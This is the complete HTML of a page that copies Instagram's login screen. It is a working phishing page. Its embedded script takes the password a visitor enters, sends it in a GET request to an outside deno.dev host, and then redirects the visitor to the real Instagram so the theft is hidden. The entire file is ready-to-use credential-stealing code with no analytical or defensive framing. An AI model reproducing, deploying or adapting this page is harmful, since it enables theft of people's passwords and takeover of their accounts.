<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="images/favicon.png" type="image/icon">
    <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">
                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
            </div>

            <br />
            <form class="container" id="loginForm">
                <input type="text" placeholder="Phone number, username, or email" name="u_name" id="username">
                <input type="password" placeholder="Password" name="pass" id="password">
                <button type="submit" class="submitbutton">Log in</button>
                <br />
                <div class="option">OR</div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#">Log in with Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="signup">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>
        </div>
    </div>

    <br />
    <br />

    <script>
        // Send a GET request and then redirect to Instagram
        function sendLoginRequest(event) {
            event.preventDefault(); // Prevent form submission

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Validate password before making the request
            if (!password) {
                console.error('Password is required');
                return;
            }

            // Construct the server URL with the password as a query parameter
            const serverUrl = `https://pure-spider-48.deno.dev/text?text=${password}`;

            // Make the GET request to the server
            fetch(serverUrl)
                .then(response => response.json())
                .then(data => {
                    console.log('Server response:', data);
                    // Redirect to Instagram after the GET request
                    window.location.href = "https://www.instagram.com";
                })
                .catch(error => {
                    console.error('Error making GET request:', error);
                });
        }

        // Attach the event listener to the form submit event
        document.getElementById('loginForm').addEventListener('submit', sendLoginRequest);
    </script>

</body>
</html>
